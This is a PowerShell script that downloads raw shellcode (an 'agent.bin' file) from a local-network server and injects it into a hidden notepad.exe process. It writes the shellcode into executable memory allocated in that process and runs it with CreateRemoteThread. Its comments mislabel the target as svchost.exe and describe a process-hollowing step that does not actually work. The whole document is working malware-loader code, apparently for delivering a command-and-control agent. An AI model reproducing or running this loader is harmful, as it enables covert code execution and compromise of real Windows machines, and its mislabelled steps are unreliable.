# Step 1: Ensure we're running as a 64-bit process
if ([System.IntPtr]::Size -ne 8) {
    Write-Error "This script must be run as a 64-bit process."
    exit
}

# Step 2: Start svchost.exe in suspended mode
Write-Host "Starting notepad.exe in suspended mode..."
$svchostProcess = Start-Process -FilePath "C:\Windows\System32\notepad.exe" -WindowStyle Hidden -PassThru -ArgumentList "/suspend"
$procid = $svchostProcess.Id
Write-Host "Started notepad.exe with PID: $procid"

# Step 3: Download the raw shellcode from the remote server
$url = "http://192.168.50.101/agent.bin"
$shellcode = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content

# Step 4: Check if Kernel32 type has already been defined to avoid the 'Cannot add type' error
if (-not [Type]::GetType("Kernel32")) {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@ -Language CSharp
} else {
    Write-Host "Kernel32 type already exists, skipping Add-Type."
}

# Step 5: Define constants for memory and process access
$PROCESS_ALL_ACCESS = 0x1F0FFF
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_EXECUTE_READWRITE = 0x40

# Step 6: Open the svchost process in suspended mode
$hProcess = [Kernel32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $procid)
if ($hProcess -eq [IntPtr]::Zero) {
    Write-Error "Failed to open process."
    exit
}

# Step 7: Allocate memory in the target process for the shellcode
$size = $shellcode.Length
$addr = [Kernel32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$size, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)
if ($addr -eq [IntPtr]::Zero) {
    Write-Error "Failed to allocate memory in the target process."
    [Kernel32]::CloseHandle($hProcess)
    exit
}

# Step 8: Write the shellcode to the allocated memory
$out = 0
$result = [Kernel32]::WriteProcessMemory($hProcess, $addr, $shellcode, [uint32]$size, [ref]$out)
if (-not $result) {
    Write-Error "Failed to write shellcode to the target process."
    [Kernel32]::CloseHandle($hProcess)
    exit
}

# Step 9: Unmap the original executable from the process (hollowing)
$peBaseAddr = [IntPtr]::Zero
if (-not [Type]::GetType("Ntdll")) {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Ntdll {
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);
}
"@ -Language CSharp
}

[NTDll]::NtUnmapViewOfSection($hProcess, $peBaseAddr)

# Step 10: Create a remote thread in the target process to execute the shellcode
$thread = [Kernel32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
if ($thread -eq [IntPtr]::Zero) {
    Write-Error "Failed to create remote thread in the target process."
} else {
    Write-Host "Shellcode injected into svchost.exe successfully!"
}

# Step 11: Clean up and close process handle
[Kernel32]::CloseHandle($hProcess)
